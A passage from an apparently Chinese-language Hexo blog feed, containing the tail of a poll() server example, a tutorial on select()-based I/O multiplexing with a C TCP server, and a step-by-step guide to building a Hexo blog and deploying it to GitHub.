class="keyword">else</span> &#123;        <span class="comment">// receive data</span></div><div class="line">                    <span class="keyword">if</span> (ret &lt; BUF_SIZE)</div><div class="line">                        <span class="built_in">memset</span>(&amp;buf[ret], <span class="string">'\0'</span>, <span class="number">1</span>);</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">"client[%d] send:%s\n"</span>, i, buf);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line"></div><div class="line">        showclient();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// close other connections</span></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nfds; i++) &#123;</div><div class="line">        <span class="keyword">if</span> (pollfds[i].fd != <span class="number">0</span>) &#123;</div><div class="line">            close(pollfds[i].fd);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;poll和select实现功能差不多，但poll效率比select效率高。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://maoao530.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://maoao530.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>I/O Multiplexing &amp; select</title>
    <link href="https://maoao530.github.io/2016/03/17/io-multiplexing-select/"/>
    <id>https://maoao530.github.io/2016/03/17/io-multiplexing-select/</id>
    <published>2016-03-17T14:46:56.000Z</published>
    <updated>2016-12-10T05:40:33.555Z</updated>
    
    <content type="html"><![CDATA[<p>I / O多路转接(I/O multiplexing),其基本思想是:先构造一张有关描述符的表,然后调用一个函数,它要到这些描述符中的一个已准备好进行 I / O时才返回.<br>在返回时,它告诉进程哪一个描述符已准备好可以进行 I / O。</p>
<a id="more"></a>
<h1 id="1-什么是I-O-Multiplexing？"><a href="#1-什么是I-O-Multiplexing？" class="headerlink" title="1. 什么是I/O Multiplexing？"></a>1. 什么是I/O Multiplexing？</h1><p>I/O multiplexing就是我们说的select，poll，epoll，有些地方也称这种IO方式为event driven IO。其好处就在于单个process就可以同时处理多个网络连接的IO。<br>我们在这里仅仅来讨论select，它的基本原理就是会不断的轮询所负责的所有fdset，当某个fd有数据到达了，就通知用户进程来处理fd的读或者写事件。如果没有fd就绪，select会根据参数选择一直阻塞或者timeout。</p>
<p>I/O 多路复用的特点是通过一种机制一个进程能同时等待多个文件描述符，而这些文件描述符（套接字描述符）其中的任意一个进入读就绪状态，select()函数就可以返回。</p>
<p><img src="/img/archives/io_mul.png" alt="I/O 多路复用"></p>
<h1 id="2-select函数说明"><a href="#2-select函数说明" class="headerlink" title="2. select函数说明"></a>2. select函数说明</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> maxfd,fd_set *readfds,fd_set *writefds, fd_set *exceptfds,<span class="keyword">struct</span> timeval *timeout)</span></span>;  </div><div class="line"><span class="comment">//maxfd      是需要监视的最大的文件描述符值+1</span></div><div class="line"><span class="comment">//readfds    需要检测的可读文件描述符的集合</span></div><div class="line"><span class="comment">//writefds   可写文件描述符的集合</span></div><div class="line"><span class="comment">//exceptfds 异常文件描述符的集合</span></div></pre></td></tr></table></figure>
<p>下面的宏提供了处理这三种fd_set的方式:</p>
<blockquote>
<p>FD_CLR(inr fd,fd_set<em> set)；用来清除描述词组set中相关fd 的位<br>FD_ISSET(int fd,fd_set </em>set)；用来测试描述词组set中相关fd 的位是否为真<br>FD_SET（int fd,fd_set<em>set）；用来设置描述词组set中相关fd的位<br>FD_ZERO（fd_set </em>set）；用来清除描述词组set的全部位</p>
</blockquote>
<p>另外：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> timeval&#123;</div><div class="line">    <span class="keyword">long</span> tv_sec;  <span class="comment">/* seconds */</span></div><div class="line">    <span class="keyword">long</span> tv_usec; <span class="comment">/* and microseconds */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>如果参数timeout设为：</p>
<ul>
<li>NULL，则表示select（）没有timeout，select将一直被阻塞，直到某个文件描述符上发生了事件</li>
<li>0：仅检测描述符集合的状态，然后立即返回，并不等待外部事件的发生</li>
<li>特定的时间值：如果在指定的时间段里没有事件发生，select将超时返回</li>
</ul>
<h1 id="3-select函数返回值"><a href="#3-select函数返回值" class="headerlink" title="3. select函数返回值"></a>3. select函数返回值</h1><p>执行成功则返回文件描述词状态已改变的个数，如果返回0代表在描述词状态改变前已超过timeout时间，没有返回；当有错误发生时则返回-1，错误原因存于errno，此时参数readfds，writefds，exceptfds和timeout的值变成不可预测。错误值可能为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// EBADF 文件描述词为无效的或该文件已关闭</div><div class="line">// EINTR 此调用被信号所中断</div><div class="line">// EINVAL 参数n 为负值。</div><div class="line">// ENOMEM 核心内存不足</div></pre></td></tr></table></figure></p>
<h1 id="4-理解Select模型："><a href="#4-理解Select模型：" class="headerlink" title="4.理解Select模型："></a>4.理解Select模型：</h1><p>例如,我们若编写下列代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">fd_set readset, writeset;</div><div class="line">FD_ZERO(&amp;readset) ;</div><div class="line">FD_ZERO(&amp;writeset) ;</div><div class="line">FD_SET(0, &amp;readset);</div><div class="line">FD_SET(3, &amp;readset);</div><div class="line">FD_SET(1, &amp;writeset);</div><div class="line">FD_SET(2, &amp;writeset);</div><div class="line">select (4,  &amp;readset, &amp;writeset, NULL, NULL);</div></pre></td></tr></table></figure></p>
<p>那么对应的fd_set模型为：</p>
<p><img src="/img/archives/select.png" alt="fdset模型"></p>
<h1 id="5-如何利用select设计的web服务器："><a href="#5-如何利用select设计的web服务器：" class="headerlink" title="5. 如何利用select设计的web服务器："></a>5. 如何利用select设计的web服务器：</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span>  </span></div><div class="line">  </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MYPORT 88960    <span class="comment">// the port users will be connecting to  </span></span></div><div class="line">  </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BACKLOG 10     <span class="comment">// how many pending connections queue will hold  </span></span></div><div class="line">  </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 200  </span></div><div class="line">  </div><div class="line"><span class="keyword">int</span> fd_A[BACKLOG];    <span class="comment">// accepted connection fd  </span></div><div class="line"><span class="keyword">int</span> conn_amount;    <span class="comment">// current connection amount  </span></div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">showclient</span><span class="params">()</span>  </span></div><div class="line">&#123;  </div><div class="line">    <span class="keyword">int</span> i;  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"client amount: %d\n"</span>, conn_amount);  </div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; BACKLOG; i++) &#123;  </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[%d]:%d  "</span>, i, fd_A[i]);  </div><div class="line">    &#125;  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></div><div class="line">&#123;  </div><div class="line">    <span class="keyword">int</span> sock_fd, new_fd;  <span class="comment">// listen on sock_fd, new connection on new_fd  </span></div><div class="line">    <span class="keyword">struct</span> sockaddr_in server_addr;    <span class="comment">// server address information  </span></div><div class="line">    <span class="keyword">struct</span> sockaddr_in client_addr; <span class="comment">// connector's address information  </span></div><div class="line">    <span class="keyword">socklen_t</span> sin_size;  </div><div class="line">    <span class="keyword">int</span> yes = <span class="number">1</span>;  </div><div class="line">    <span class="keyword">char</span> buf[BUF_SIZE];  </div><div class="line">    <span class="keyword">int</span> ret;  </div><div class="line">    <span class="keyword">int</span> i;  </div><div class="line">  </div><div class="line">    <span class="keyword">if</span> ((sock_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == <span class="number">-1</span>) &#123;  </div><div class="line">        perror(<span class="string">"socket"</span>);  </div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    <span class="keyword">if</span> (setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) == <span class="number">-1</span>) &#123;  </div><div class="line">        perror(<span class="string">"setsockopt"</span>);  </div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);  </div><div class="line">    &#125;  </div><div class="line">      </div><div class="line">    server_addr.sin_family = AF_INET;         <span class="comment">// host byte order  </span></div><div class="line">    server_addr.sin_port = htons(MYPORT);     <span class="comment">// short, network byte order  </span></div><div class="line">    server_addr.sin_addr.s_addr = INADDR_ANY; <span class="comment">// automatically fill with my IP  </span></div><div class="line">    <span class="built_in">memset</span>(server_addr.sin_zero, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(server_addr.sin_zero));  </div><div class="line">  </div><div class="line">    <span class="keyword">if</span> (bind(sock_fd, (<span class="keyword">struct</span> sockaddr *)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == <span class="number">-1</span>) &#123;  </div><div class="line">        perror(<span class="string">"bind"</span>);  </div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    <span class="keyword">if</span> (listen(sock_fd, BACKLOG) == <span class="number">-1</span>) &#123;  </div><div class="line">        perror(<span class="string">"listen"</span>);  </div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"listen port %d\n"</span>, MYPORT);  </div><div class="line">  </div><div class="line">    fd_set fdsr;  </div><div class="line">    <span class="keyword">int</span> maxsock;  </div><div class="line">    <span class="keyword">struct</span> timeval tv;  </div><div class="line">  </div><div class="line">    conn_amount = <span class="number">0</span>;  </div><div class="line">    sin_size = <span class="keyword">sizeof</span>(client_addr);  </div><div class="line">    maxsock = sock_fd;  </div><div class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;  </div><div class="line">        <span class="comment">// initialize file descriptor set  </span></div><div class="line">        FD_ZERO(&amp;fdsr);  </div><div class="line">        FD_SET(sock_fd, &amp;fdsr);  </div><div class="line">  </div><div class="line">        <span class="comment">// timeout setting  </span></div><div class="line">        tv.tv_sec = <span class="number">30</span>;  </div><div class="line">        tv.tv_usec = <span class="number">0</span>;  </div><div class="line">  </div><div class="line">        <span class="comment">// add active connection to fd set  </span></div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; BACKLOG; i++) &#123;  </div><div class="line">            <span class="keyword">if</span> (fd_A[i] != <span class="number">0</span>) &#123;  </div><div class="line">                FD_SET(fd_A[i], &amp;fdsr);  </div><div class="line">            &#125;  </div><div class="line">        &#125;  </div><div class="line">  </div><div class="line">        ret = select(maxsock + <span class="number">1</span>, &amp;fdsr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;tv);  </div><div class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;  </div><div class="line">            perror(<span class="string">"select"</span>);  </div><div class="line">            <span class="keyword">break</span>;  </div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;  </div><div class="line">            <span class="built_in">printf</span>(<span class="string">"timeout\n"</span>);  </div><div class="line">            <span class="keyword">continue</span>;  </div><div class="line">        &#125;  </div><div class="line">  </div><div class="line">        <span class="comment">// check every fd in the set  </span></div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; conn_amount; i++) &#123;  </div><div class="line">            <span class="keyword">if</span> (FD_ISSET(fd_A[i], &amp;fdsr)) &#123;  </div><div class="line">                ret = recv(fd_A[i], buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);  </div><div class="line">                  </div><div class="line">                <span class="keyword">char</span> str[] = <span class="string">"Good,very nice!\n"</span>;  </div><div class="line">                  </div><div class="line">                send(fd_A[i],str,<span class="keyword">sizeof</span>(str) + <span class="number">1</span>, <span class="number">0</span>);  </div><div class="line">                  </div><div class="line">                  </div><div class="line">                <span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;        <span class="comment">// client close  </span></div><div class="line">                    <span class="built_in">printf</span>(<span class="string">"client[%d] close\n"</span>, i);  </div><div class="line">                    close(fd_A[i]);  </div><div class="line">                    FD_CLR(fd_A[i], &amp;fdsr);  </div><div class="line">                    fd_A[i] = <span class="number">0</span>;  </div><div class="line">                &#125; <span class="keyword">else</span> &#123;        <span class="comment">// receive data  </span></div><div class="line">                    <span class="keyword">if</span> (ret &lt; BUF_SIZE)  </div><div class="line">                        <span class="built_in">memset</span>(&amp;buf[ret], <span class="string">'\0'</span>, <span class="number">1</span>);  </div><div class="line">                    <span class="built_in">printf</span>(<span class="string">"client[%d] send:%s\n"</span>, i, buf);  </div><div class="line">                &#125;  </div><div class="line">            &#125;  </div><div class="line">        &#125;  </div><div class="line">  </div><div class="line">        <span class="comment">// check whether a new connection comes  </span></div><div class="line">        <span class="keyword">if</span> (FD_ISSET(sock_fd, &amp;fdsr)) &#123;  </div><div class="line">            new_fd = accept(sock_fd, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;sin_size);  </div><div class="line">            <span class="keyword">if</span> (new_fd &lt;= <span class="number">0</span>) &#123;  </div><div class="line">                perror(<span class="string">"accept"</span>);  </div><div class="line">                <span class="keyword">continue</span>;  </div><div class="line">            &#125;  </div><div class="line">  </div><div class="line">            <span class="comment">// add to fd queue  </span></div><div class="line">            <span class="keyword">if</span> (conn_amount &lt; BACKLOG) &#123;  </div><div class="line">                fd_A[conn_amount++] = new_fd;  </div><div class="line">                <span class="built_in">printf</span>(<span class="string">"new connection client[%d] %s:%d\n"</span>, conn_amount,  </div><div class="line">                        inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));  </div><div class="line">                <span class="keyword">if</span> (new_fd &gt; maxsock)  </div><div class="line">                    maxsock = new_fd;  </div><div class="line">            &#125;  </div><div class="line">            <span class="keyword">else</span> &#123;  </div><div class="line">                <span class="built_in">printf</span>(<span class="string">"max connections arrive, exit\n"</span>);  </div><div class="line">                send(new_fd, <span class="string">"bye"</span>, <span class="number">4</span>, <span class="number">0</span>);  </div><div class="line">                close(new_fd);  </div><div class="line">                <span class="keyword">break</span>;  </div><div class="line">            &#125;  </div><div class="line">        &#125;  </div><div class="line">        showclient();  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    <span class="comment">// close other connections  </span></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; BACKLOG; i++) &#123;  </div><div class="line">        <span class="keyword">if</span> (fd_A[i] != <span class="number">0</span>) &#123;  </div><div class="line">            close(fd_A[i]);  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;I / O多路转接(I/O multiplexing),其基本思想是:先构造一张有关描述符的表,然后调用一个函数,它要到这些描述符中的一个已准备好进行 I / O时才返回.&lt;br&gt;在返回时,它告诉进程哪一个描述符已准备好可以进行 I / O。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://maoao530.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://maoao530.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>一步一步搭建hexo博客</title>
    <link href="https://maoao530.github.io/2016/02/23/hexo-blog/"/>
    <id>https://maoao530.github.io/2016/02/23/hexo-blog/</id>
    <published>2016-02-23T07:16:27.000Z</published>
    <updated>2016-12-10T14:06:40.722Z</updated>
    
    <content type="html"><![CDATA[<p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。<br><a id="more"></a></p>
<h1 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h1><p>因为我是在windows下，所以需要先安装Git和Node.js：</p>
<ul>
<li><a href="https://github.com/git-for-windows/git/releases/download/v2.10.1.windows.1/Git-2.10.1-64-bit.exe" target="_blank" rel="external">Git for windows</a></li>
<li><a href="https://nodejs.org/dist/v4.6.1/node-v4.6.1-x64.msi" target="_blank" rel="external">Node.js</a><br>安装过程就不多说了。</li>
</ul>
<h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h1><p>打开git，cd到你需要安装hexo的目录，然后安装hexo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install -g hexo-cli</div></pre></td></tr></table></figure>
<p><img src="/img/archives/npm-install-hexo-cli.png" alt="安装hexo"></p>
<h1 id="初始化Hexo项目"><a href="#初始化Hexo项目" class="headerlink" title="初始化Hexo项目"></a>初始化Hexo项目</h1><p>创建并且初始化hexo项目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hexo init &lt;folder&gt;</div><div class="line">cd &lt;folder&gt;</div><div class="line">npm install</div></pre></td></tr></table></figure></p>
<p>hexo默认的目录如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">├── .deploy_git</div><div class="line">├── public</div><div class="line">├── scaffolds</div><div class="line">├── scripts</div><div class="line">├── source</div><div class="line">|   ├── _drafts</div><div class="line">|   └── _posts</div><div class="line">├── themes</div><div class="line">├── _config.yml</div><div class="line">└── package.json</div></pre></td></tr></table></figure></p>
<table>
<thead>
<tr>
<th>目录</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>.deploy_git</td>
<td style="text-align:left">执行hexo deploy命令部署到GitHub上的内容目录</td>
</tr>
<tr>
<td>public</td>
<td style="text-align:left">执行hexo generate命令，输出的静态网页内容目录</td>
</tr>
<tr>
<td>scaffolds</td>
<td style="text-align:left">layout模板文件目录，其中的md文件可以添加编辑</td>
</tr>
<tr>
<td>scripts</td>
<td style="text-align:left">扩展脚本目录，这里可以自定义一些javascript脚本</td>
</tr>
<tr>
<td>source</td>
<td style="text-align:left">文章源码目录，该目录下的markdown和html文件均会被hexo处理。该页面对应repo的根目录，404文件、favicon，ico文件，CNAME文件等都应该放这里，该目录下可新建页面目录。</td>
</tr>
<tr>
<td>_drafts</td>
<td style="text-align:left">草稿文章</td>
</tr>
<tr>
<td>_posts</td>
<td style="text-align:left">发布文章</td>
</tr>
<tr>
<td>themes</td>
<td style="text-align:left">主题文件目录</td>
</tr>
<tr>
<td>_config.yml</td>
<td style="text-align:left">全局配置文件，大多数的设置都在这里</td>
</tr>
<tr>
<td>package.json</td>
<td style="text-align:left">应用程序数据，指明hexo的版本等信息，类似于一般软件中的关于按钮</td>
</tr>
</tbody>
</table>
<h1 id="hexo-命令"><a href="#hexo-命令" class="headerlink" title="hexo 命令"></a>hexo 命令</h1><p>常用几个命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">hexo new &quot;postName&quot; #新建文章</div><div class="line">hexo new page &quot;pageName&quot; #新建页面</div><div class="line">hexo generate #生成静态页面至public目录</div><div class="line">hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）</div><div class="line">hexo deploy #将.deploy目录部署到GitHub</div></pre></td></tr></table></figure></p>
<h1 id="更换next主题"><a href="#更换next主题" class="headerlink" title="更换next主题"></a>更换next主题</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd your-hexo-site</div><div class="line">$ git clone https://github.com/iissnan/hexo-theme-next themes/next</div></pre></td></tr></table></figure>
<p>修改站点配置文件_config.yml：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">theme: next</div></pre></td></tr></table></figure></p>
<p>更多关于next主题可以参考：</p>
<ul>
<li><a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="external">使用文档</a></li>
<li><a href="https://github.com/iissnan/hexo-theme-next/wiki" target="_blank" rel="external">next常见问答</a></li>
</ul>
<h1 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h1><p>hexo支持插件，可以直接通过命令行安装即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">npm install plugin-name --save</div><div class="line">//更新插件</div><div class="line">npm update</div><div class="line">//卸载插件</div><div class="line">npm uninstall plugin-name</div></pre></td></tr></table></figure></p>
<p>下面推荐几个常用的插件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//feed插件</div><div class="line">npm install hexo-generator-feed --save</div><div class="line">//站点地图</div><div class="line">npm install hexo-generator-sitemap --save</div><div class="line">//百度站点地图</div><div class="line">npm install hexo-generator-baidu-sitemap --save</div></pre></td></tr></table></figure></p>
<p>然后在 Hexo 根目录下的 _config.yml 里配置一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">feed:</div><div class="line">    type: atom      </div><div class="line">    path: atom.xml</div><div class="line">    limit: 20  # 最近20篇文章  </div><div class="line">sitemap:</div><div class="line">    path: sitemap.xml</div><div class="line">baidusitemap:</div><div class="line">    path: baidusitemap.xml</div></pre></td></tr></table></figure></p>
<h1 id="博客推广优化"><a href="#博客推广优化" class="headerlink" title="博客推广优化"></a>博客推广优化</h1><p>为了博客有更好的展示率, 最好的方式是通过搜索引擎, 下面讲讲怎么让搜索引擎搜录你的博客.</p>
<p>面以百度为例:</p>
<ul>
<li><a href="">百度网址提交入口</a></li>
</ul>
<p>百度站长平台为站长提供单条url提交通道，您可以提交想被百度收录的url，百度搜索引擎会按照标准处理，不保证一定能够收录您提交的url。<br>建议验证网站所有权后，再提交url。</p>
<p>向百度提交 Sitemap 的过程如下：</p>
<blockquote>
<ul>
<li>注册并登录百度站长平台.</li>
<li>点击 我的网站=&gt;站点管理, 添加你的域名, 类似上文中验证你的域名, 采用 文件验证 上传 html 文件的方式.</li>
<li>验证好以后就可以在 数据提交 里面提交 Sitemap 了.</li>
</ul>
</blockquote>
<p>更详细的可以参考下面这篇文章：</p>
<ul>
<li><a href="www.franktly.com/2016/07/06/让Baidu和Google收录Hexo博客/">franktly.com/2016/07/06/让Baidu和Google收录Hexo博客/</a></li>
</ul>
<h1 id="配置上传到github"><a href="#配置上传到github" class="headerlink" title="配置上传到github"></a>配置上传到github</h1><p>安装deploy git：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-deployer-git --save</div></pre></td></tr></table></figure></p>
<p>配置_config.yml：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">deploy:</div><div class="line">  type: git</div><div class="line">  repo: git@github.com:Maoao530/Maoao530.github.io.git</div><div class="line">  branch: master</div></pre></td></tr></table></figure></p>
<p>配置完成后直接<code>hexo deploy</code>,就可以了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。&lt;br&gt;
    
    </summary>
    
      <category term="其他" scheme="https://maoao530.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="Hexo" scheme="https://maoao530.github.io/tags/Hexo/"/>
    
  </entry>
  
</feed>
